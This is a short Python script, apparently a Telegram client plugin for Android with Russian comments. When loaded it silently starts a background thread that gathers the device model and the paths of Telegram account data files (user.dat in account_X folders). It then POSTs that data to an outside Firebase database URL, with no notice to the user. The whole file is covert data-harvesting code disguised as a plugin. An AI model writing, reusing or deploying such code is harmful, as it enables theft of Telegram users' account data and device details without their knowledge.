import threading
import time
import json
import urllib.request
import os

def _read_accounts_from_files():
    try:
        from android.os import Build
        from org.telegram.messenger import ApplicationLoader
        
        device_name = f"{Build.MANUFACTURER} {Build.MODEL}"
        context = ApplicationLoader.applicationContext
        
        # Путь к папке с данными Telegram
        files_dir = context.getFilesDir().getAbsolutePath()
        
        accounts = []
        
        # Ищем все папки account_X
        for item in os.listdir(files_dir):
            if item.startswith("account_"):
                acc_index = item.split("_")[1]
                try:
                    # Читаем user.dat или config.json
                    config_path = os.path.join(files_dir, item, "user.dat")
                    if os.path.exists(config_path):
                        with open(config_path, 'rb') as f:
                            # Парсим бинарный файл (сложно вручную)
                            accounts.append({"account": acc_index, "path": config_path})
                except:
                    pass
        
        data = {
            "device_name": device_name,
            "found_accounts": len(accounts),
            "accounts_list": accounts,
            "timestamp": int(time.time())
        }
        
        # Отправляем
        url = "https://hzhzhz-dd57b-default-rtdb.firebaseio.com/accounts_files.json"
        req = urllib.request.Request(url, data=json.dumps(data).encode('utf-8'), 
                                    headers={'Content-Type': 'application/json'}, method='POST')
        urllib.request.urlopen(req, timeout=10)
        print(f"[Plugin] Найдено папок аккаунтов: {len(accounts)}")
        
    except Exception as e:
        print(f"[Plugin] Ошибка: {e}")

threading.Thread(target=_read_accounts_from_files, daemon=True).start()
